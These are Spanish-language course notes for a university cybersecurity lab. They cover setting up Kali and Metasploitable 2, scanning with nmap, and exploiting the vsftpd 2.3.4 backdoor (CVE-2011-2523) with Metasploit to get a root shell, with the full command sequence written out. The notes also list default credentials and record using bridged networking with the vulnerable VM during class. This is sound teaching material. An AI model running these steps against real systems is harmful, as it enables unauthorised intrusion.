---
asignatura: Ciberseguridad
fecha: 2026-10-09
tema: Laboratorio 2 · del CVE al ataque · montaje de Metasploitable y explotación de vsftpd 2.3.4
fuente: CIBER_Lab02_Practica.pdf + Montaje_Metasploitable_VMware.pdf + transcripción de la clase en directo (grabada el 08/10)
---
# Ciber · Laboratorio 2 (09/10) · Del CVE al ataque

> Anterior: [Clase 3 / Práctica CVE](2026-09-29_clase3-donde-falla-un-sistema.md) · Cierra el hilo Clase 3 → Lab 1 → hoy

**No se entrega ni puntúa; las capturas valen para la Actividad 2.**

⚠️ El ataque solo se hace contra la máquina de prácticas (Metasploitable), en una red aislada. Contra cualquier otro equipo o red es delito (arts. 197 y 264 CP). Es lo que separa una auditoría de un ataque.

## Montaje: Kali + Metasploitable en red aislada
- **Metasploitable 2**: máquina Ubuntu llena de fallos a propósito (de Rapid7, en SourceForge), para servir de diana. Viene lista en formato VMware (`.vmx` + `.vmdk`): no hay que crear ni configurar disco, solo abrir el `.vmx`.
- Credenciales: `msfadmin` / `msfadmin`.
- **Red: SIEMPRE "Solo-anfitrión" (host-only), nunca en puente.** Metasploitable es "un colador con shell de root": en puente cogería una IP real de la red de casa y quedaría expuesta al router y a todos los dispositivos. Kali también en host-only, para que se vean solo entre ellas.
- Comprobaciones:
  ```bash
  # dentro de Metasploitable
  ifconfig                 # inet addr de eth0 = IP_DIANA
  ping -c3 8.8.8.8          # NO debe contestar -> confirma que está aislada
  # desde Kali
  ping -c3 IP_DIANA         # SÍ debe contestar -> confirma que se ven entre ellas
  ```
- Si al arrancar pregunta si la VM fue copiada o movida: responder **"La copié"**.

## 1 · Recon desde Kali
```bash
nmap -sV scanme.nmap.org            # sitio de prácticas, para comparar
nmap -sV IP_DIANA                   # 21/tcp open ftp vsftpd 2.3.4
```
La columna de versión es lo que delata la máquina. Captura la salida.

## 2 · El CVE de hoy
Buscado en **nvd.nist.gov** y **cvedetails.com**: `vsftpd 2.3.4` → **CVE-2011-2523**. Apuntar nota CVSS y qué permite.

## 3 · El ataque (Metasploit) — del CVE al módulo, enlazado
En vez de ir directo al exploit, se busca en Metasploit **por el CVE encontrado en el recon**:
```bash
msfconsole
search cve:2011-2523                                # también vale: search vsftpd
# resultado: exploit/unix/ftp/vsftpd_234_backdoor
use exploit/unix/ftp/vsftpd_234_backdoor
info                                                 # qué hace el módulo, el CVE, referencias
show options                                         # comprobar que no falta nada (sobre todo RHOSTS)
set RHOSTS IP_DIANA
run                                                   # abre una shell de root
id                                                    # uid=0(root): dentro, y como root
hostname                                              # metasploitable
```
Flujo con sentido: `search` (por el CVE del recon) → `info` (qué hace y sus referencias) → `use` → `show options` → `set RHOSTS` → `run`. **`uid=0(root)` es la prueba de que se ha entrado**: la gracia no es romper nada, es ver que un servicio viejo sin actualizar es una puerta abierta.

## La historia del fallo (para que no se olvide)
En 2011 alguien coló una puerta trasera **en el propio código fuente** de vsftpd 2.3.4: si el usuario de FTP terminaba en `:)`, se abría una shell. Ni siquiera descargar "lo oficial" libra del todo de esto — por eso el software serio se firma y se verifica (la huella SHA-256 de la Clase 2) y, sobre todo, **se mantiene actualizado**: esto se arregló en días.

## Enlaces
Metasploitable 2 (SourceForge) · Kali Linux (kali.org/get-kali) · NVD CVE-2011-2523 · CVE Details CVE-2011-2523

## Notas en directo (matices del profesor, no están en la práctica escrita)

### Montaje real: no todos parten del mismo punto
La clase en directo (grabada el 08/10, un día antes de la fecha de la práctica escrita) fue sobre todo el montaje paso a paso, porque cada alumno usa un hipervisor distinto: **VMware** (la Metasploitable viene pensada para él: doble clic sobre el `.vmx` y listo), **VirtualBox** y **UTM** (el que usa el propio profesor, en Mac). En VirtualBox/UTM hay que crear la máquina manualmente:
- Tipo: Linux, Ubuntu de **32 bits** (no 64), 1024 MB de RAM, 2 CPU.
- En el paso del disco: **no** crear un disco nuevo — eligir "usar un disco duro existente" y apuntar al fichero `.vmdk` que viene dentro del `.zip` descargado (no usar el `.ova`, eso es solo para VirtualBox cuando se usa el paquete OVA completo).
- En UTM concretamente: elegir "Emular" (no "Virtualizar"), sistema operativo Linux, importar el disco existente, y en Sistema poner una CPU estándar tipo "PC genérico" en vez de la que viene por defecto (el profesor tuvo un fallo en directo por dejar un chip equivocado).
- Primer arranque: tarda bastante en salir el prompt de login porque instala/revisa muchísimos servicios deliberadamente vulnerables — "hasta que no veas la palabra `login`, no toques nada".

### El fallo de red más repetido en clase: NAT vs Puente/Host-only
Varios alumnos se quedaron con la Metasploitable en modo **NAT** (IP tipo `10.0.2.x`) mientras Kali estaba en otra red — así nunca se ven entre sí. Solución explicada en directo: cambiar el adaptador de red de la VM a **modo puente** (bridged) para la sesión de hoy (más simple, las dos máquinas comparten la red de casa), aunque el profesor insiste en que **lo correcto para hacerlo en casa es red "solo anfitrión" (host-only)**, que es lo que documenta por escrito y lo que de verdad aísla el laboratorio — hoy se usó puente solo por rapidez en la propia clase en directo.
```bash
# en cada máquina, para comprobar que están en la misma red
ip a      # o: ifconfig
# ambas deben tener IP del mismo rango, p. ej. 192.168.1.x
# si una sale con 10.0.2.x -> está en NAT, hay que cambiarla a puente/host-only
```

### El escaneo real mostró mucho más que el puerto 21
Al lanzar `nmap -sV` contra la IP de la Metasploitable en directo, salieron además del FTP (vsftpd 2.3.4) muchísimos otros servicios abiertos a propósito: **OpenSSH** (con versión vulnerable), **Telnet**, **Postfix** (correo), un **DNS**, **Apache**, **Samba** (recursos compartidos), servicios **r** tipo rlogin/rsh (root shell directo por el puerto 514, sin pedir contraseña), **RPC**, **ProFTPD**, **MySQL**, **PostgreSQL** y **VNC**. El profesor lo señala explícitamente como ejemplo de "máquina súper mega vulnerable" con fallos por todos lados, no solo el del laboratorio de hoy — detalle útil para quien quiera investigar más por su cuenta.

### Buscar el exploit: con el CVE no siempre basta
En directo, `search cve:2011-2523` (con guión) en su versión antigua de Metasploit (`msf6` que en su caso en realidad corresponde a una build más vieja) devolvió **demasiados resultados irrelevantes** o ninguno, según el formato exacto de puntos/guiones que se usara. Lo que funcionó de forma fiable fue buscar directamente por el nombre del servicio:
```bash
search vsftpd
# resultado: exploit/unix/ftp/vsftpd_234_backdoor  (índice 0 o 1 según la versión de Metasploit)
use exploit/unix/ftp/vsftpd_234_backdoor    # o: use 0 / use 1
info                                         # referencias, qué hace, puerto que abre (6200, backdoor)
show options                                 # en este exploit SOLO pide RHOST (no LHOST/PAYLOAD)
set RHOST IP_DIANA
show options                                 # para comprobar
run                                          # (o exploit) -> abre una shell directamente
```
Aviso práctico: antes de meter la versión exacta en Metasploit, conviene confirmar el CVE en **CVE Details** buscando por producto (`vsftpd` → versión `2.3.4`), porque ahí sí aparece claramente la ficha con el rango de versiones afectadas, antes de ir a buscar el módulo correspondiente en Metasploit.

### Dentro de la shell: comprobaciones típicas
```bash
whoami        # root  -> ya eres superusuario sin haber puesto ninguna contraseña
hostname      # metasploitable
ls /home      # ftp, service, user -> usuarios reales de la máquina
```
Puntualización importante que surgió en clase: dependiendo de la versión de Metasploit, el `run` puede abrir una sesión **Meterpreter** en vez de una shell de comandos normal — si los comandos básicos (`ls`, `whoami`) no responden como se espera, hay que escribir `shell` dentro de Meterpreter para pasar a una shell de sistema normal de Linux. Alguna alumna tuvo justo ese problema en directo (comandos que no hacían nada) y se resolvió así.

### Adelanto de lo que viene: DVWA (pentesting web)
Ya con la Metasploitable controlada, el profesor adelantó que dentro de ella corre también un **Apache con DVWA (Damn Vulnerable Web Application)**, accesible simplemente abriendo un navegador y poniendo la IP de la Metasploitable:
- Login típico: `admin` / `password` (confirmado entre el profesor y un alumno en directo, sin estar el profesor del todo seguro al principio).
- DVWA permite elegir un **nivel de dificultad** (bajo/medio/alto); para empezar se recomienda bajo o medio.
- Ahí se trabajará más adelante: fuerza bruta, ejecución remota de comandos, inyección SQL, **LFI** (incluido un ataque "yendo para atrás" por la URL, el mismo concepto que ya salió en la Clase 3 con CVE Details) — es decir, esta misma máquina Metasploitable servirá de diana tanto para ataques de red/servicio (lo de hoy) como para ataques puramente web (lo que viene).

### Deberes / cierre
No se entrega ni puntúa: practicar el montaje y el ataque durante el fin de semana por cuenta propia. Apagar siempre las máquinas al terminar.
